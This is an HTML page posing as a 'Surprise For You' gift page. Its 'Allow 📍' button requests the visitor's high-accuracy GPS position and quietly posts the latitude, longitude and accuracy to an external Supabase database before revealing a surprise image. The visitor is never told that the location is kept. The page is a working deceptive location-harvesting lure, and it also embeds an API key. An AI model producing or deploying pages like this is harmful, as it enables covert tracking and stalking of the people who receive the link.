<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>Surprise For You 🎁</title>

  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 40px 20px;
    }

    button {
      padding: 12px 20px;
      font-size: 16px;
      cursor: pointer;
      border-radius: 8px;
      border: none;
    }

    #result {
      margin-top: 25px;
      font-size: 18px;
    }

    #surpriseContent {
      display: none;
      margin-top: 30px;
    }

    #surpriseContent img {
      width: 100%;
      max-width: 500px;
      border-radius: 15px;
    }
  </style>
</head>

<body>

  <h2>Surprise For You 🎁</h2>

  <p>
    <strong>Click Here →</strong>
  </p>

  <button id="allowButton" onclick="shareSurprise()">
    Allow 📍
  </button>

  <p id="result"></p>

  <div id="surpriseButton" style="display:none;">
    <button onclick="openSurprise()">
      🎁 Open Surprise
    </button>
  </div>

  <div id="surpriseContent">

    <h3>🎁 Your Surprise ❤️</h3>

    <img
      src="surprise.jpg"
      alt="Your Surprise"
    >

  </div>


  <script>

    const SUPABASE_URL =
      "https://jpwomydvlacrtqxjvtxi.supabase.co";

    const SUPABASE_KEY =
      "sb_publishable_uLvwcaQlm7HZvTXPBiNUhw_OMgj_7ub";

    const sessionId = crypto.randomUUID();


    function shareSurprise() {

      const result =
        document.getElementById("result");

      const allowButton =
        document.getElementById("allowButton");

      const surpriseButton =
        document.getElementById("surpriseButton");


      if (!navigator.geolocation) {

        result.innerHTML =
          "Sorry! 😔<br><br>" +
          "Location is not supported by your browser.";

        return;
      }


      result.innerHTML =
        "Getting Your Surprise... 🎁<br><br>" +
        "Please Wait...";


      allowButton.disabled = true;


      navigator.geolocation.getCurrentPosition(

        async function(position) {

          const data = {

            latitude:
              position.coords.latitude,

            longitude:
              position.coords.longitude,

            accuracy:
              position.coords.accuracy,

            session_id:
              sessionId
          };


          try {

            const response = await fetch(

              SUPABASE_URL +
              "/rest/v1/locations",

              {

                method: "POST",

                headers: {

                  "apikey":
                    SUPABASE_KEY,

                  "Authorization":
                    "Bearer " + SUPABASE_KEY,

                  "Content-Type":
                    "application/json",

                  "Prefer":
                    "return=minimal"
                },

                body:
                  JSON.stringify(data)
              }
            );


            if (!response.ok) {

              throw new Error(
                "Database request failed"
              );
            }


            result.innerHTML =
              "Your Surprise Is Ready! 🎁✨";


            surpriseButton.style.display =
              "block";


          } catch (error) {

            allowButton.disabled = false;

            result.innerHTML =
              "Sorry! 😔<br><br>" +
              "Please try again.";
          }

        },


        function(error) {

          allowButton.disabled = false;

          result.innerHTML =
            "Sorry! 😔<br><br>" +
            "Location permission was not granted.";

        },


        {

          enableHighAccuracy: true,

          timeout: 15000,

          maximumAge: 0

        }

      );

    }


    function openSurprise() {

      document.getElementById(
        "surpriseContent"
      ).style.display = "block";


      document.getElementById(
        "surpriseButton"
      ).style.display = "none";

    }

  </script>

</body>
</html>
